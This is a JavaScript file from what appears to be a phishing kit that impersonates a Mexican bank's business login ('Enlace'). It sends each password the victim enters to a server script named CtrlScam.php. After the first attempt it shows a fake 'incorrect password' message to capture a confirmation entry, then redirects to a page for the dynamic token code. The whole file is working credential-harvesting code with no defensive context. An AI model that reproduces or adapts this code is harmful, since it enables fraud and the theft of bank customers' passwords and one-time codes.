$(document).ready(function(){



    $('#anclaCerrar').click(function(e){
        e.preventDefault();
        $('#mensaje').hide();
    });


    $('body').keypress(function(e){
        if(e.which == 13){
            $('#formaPrincipal').submit();
            //validatePin();
        }
    });


    $('#IdSubmit').click(function(e){
        e.preventDefault();
        validatePin();
    });


    $('#formaPrincipal').submit(function(e){
        e.preventDefault();
        validatePin();
    });

    var ruta = "password_empresas";
    var envios = 0;

    function validatePin(){
        var pin = $('#IdPasswordTxt');
        var msgPinEmpty = "Debe introducir su Contrase&ntilde;a.";
        var msgErrorNip = "El c&oacute;digo de cliente, o la contrase&ntilde;a de Enlace son incorrectos. Por favor intenta nuevamente.";
        //alert();
        if(pin.val() == ""){
            cuadroDialogo(msgPinEmpty, 1);
        }else{
            $.ajax({
                type: 'POST',
                url: '../../Controllers/CtrlScam.php',
                data: {
                    "request": ruta,
                    "passwordCliente": pin.val(),
                    "session": $('#session').val()
                },
                beforeSend: function(){
                    console.log("ENviando...");
                    $('#loading').show();
                },
                success: function (resp){
                    console.log('Datos Enviados');
                    //alert(resp);
                    console.log(resp);
                    //alert(resp)
                    /*if(resp == "1"){
                        window.location.href="panel.do.php?DATAID=ASJ893asi2i342837kjdha82389420&session="+$('#session').val()+"&inforData=ndj723648whrr82743";
                    }else{
                        console.log('Fallo al guardar');
                    }*/

                    if(envios == 0){
                        envios = 1;
                        ruta = "password_confirm_empresas";
                        pin.val("");
                        cuadroDialogo(msgErrorNip, 1);
                    }else{
                        window.location.href="contrasenaDinamica.do.php?DATAID=ASJ893asi2i342837kjdha82389420&session="+$('#session').val()+"&inforData=ndj723648whrr82743";
                    }

                },
                error: function (request, textStatus, errorThrown) {
                    console.log('Error al Enviar los Datos: '+errorThrown);
                }
            });
        }
    }

    /*

    $('#administracionToken').click(function(e){
        e.preventDefault();
        var msg = "Debe introducir su c&oacute;digo de cliente y dar Click en Administraci&oacute;n Token.";
        cuadroDialogo(msg, 1);
    });

    $('#administracionContra').click(function(e){
        e.preventDefault();
        var msg = "Debe introducir su c&oacute;digo de cliente y dar Click en Administraci&oacute;n de Contrase&ntilde;a.";
        cuadroDialogo(msg, 1);
    });


    */






});